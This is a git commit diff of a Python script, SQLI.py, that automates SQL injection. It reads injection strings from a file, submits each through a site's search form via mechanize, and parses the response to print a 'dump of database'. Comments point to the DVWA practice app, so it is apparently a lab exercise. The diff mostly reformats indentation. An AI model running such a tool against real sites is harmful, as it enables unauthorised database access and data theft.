e2159f95ac07046b2ed16f2516f24fc4ba37f2fc
rkornmeyer <robert@kornmeyer.org>
2013-05-04 10:22:02 -0400

    modified:   SQLI.py

--- SQLI.py
+++ SQLI.py
@@ -15,12 +15,12 @@ lines = f_open.readlines()
 f_open.close()
 output_array = []
 for line in lines :
-	line_stuff = line.split('\n')
-	output_array.append(line_stuff)
+    line_stuff = line.split('\n')
+    output_array.append(line_stuff)
 
 hotSQLinjection = output_array
 
-#Which website? 
+#Which website?
 WEBSITE = 'http://www.google.com'
 
 #raw_input('Enter a Website to Investigate: ')
@@ -56,10 +56,10 @@ browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 #br.set_debug_responses(True)
 #############################
 # User-Agent (this is cheating, ok?)
-browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US;rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
 
-#open selected browser 
+#open selected browser
 browser.open(WEBSITE)
 
 #Printing to browser title to show where I am
@@ -68,23 +68,23 @@ print "#" + browser.title()
 print "#" *55 + "\n"
 
 
-#find & print forms 
-for form in browser.forms() : 
-	print form
+#find & print forms
+for form in browser.forms():
+    print form
 
-#submit the form 
-i=0
-for items in hotSQLinjection :
+#submit the form
+i = 0
+for items in hotSQLinjection:
 
-	browser.select_form(nr=0)	
-	browser.form['q'] = str(hotSQLinjection[i])
-	browser.submit()
-	i+=1
-	print "\n"
-	print "#" *55
-	print "# " + " The SQL Injection that will be used is: " + str(hotSQLinjection[i])
-	print "# " + " Injecting now"
-	print "#" *55
+    browser.select_form(nr=0)	
+    browser.form['q'] = str(hotSQLinjection[i])
+    browser.submit()
+    print "\n"
+    print "#" *55
+    print "# " + " The SQL Injection that will be used is: " + str(hotSQLinjection[i])
+    print "# " + " Injecting now"
+    print "#" *55
+    i+=1
 
 
 #Below I am filling out the form fields and submitting for log in
@@ -93,9 +93,9 @@ for items in hotSQLinjection :
 #browser.submit()
 
 #Again printing the browser title to show where I am
-	print "#" *55
-	print "# " + browser.title()
-	print "#" *55
+    print "#" *55
+    print "# " + browser.title()
+    print "#" *55
 
 
 
@@ -103,36 +103,35 @@ for items in hotSQLinjection :
 #browser.select_form(nr=0)
 
 #This feeds the the browser page into a variable to feed into the BeautifulSoup parser
-	page1 =  browser.response().read()
+    page1 = browser.response().read()
 
 #As it says!
-	print "\n"
-	print "#" *55
-	print "# " + " Feeding page into BeautifulSoup LXML Parser"
-	print "#" *55
-
-	soup1 = BeautifulSoup(page1, "lxml")
+    print "\n"
+    print "#" *55
+    print "# " + " Feeding page into BeautifulSoup LXML Parser"
+    print "#" *55
+    soup1 = BeautifulSoup(page1, "lxml")
 
 #The "sensitive" info from the injection is surrounded by tags
 #This creates a list to iterate though
-	allPRE =  soup1.find_all('pre')
+    allPRE =  soup1.find_all('pre')
 
 #Printing out the "sensitve" information from the DVWA database
-	print "\n"
-	print "#" *55
-	print "# " + " Dump of database"
-	print "#" *55
+    print "\n"
+    print "#" *55
+    print "# " + " Dump of database"
+    print "#" *55
 
 #Iterating through the list
 
-	for pre in allPRE :
-    		print pre
+    for pre in allPRE:
+            print pre
 
 #All done
-	print "\n"
-	print "#" *55
-	print "# " + " Injection and dump complete"
-	print "#" *55
-	print "\n"
+    print "\n"
+    print "#" *55
+    print "# " + " Injection and dump complete"
+    print "#" *55
+    print "\n"
 
 
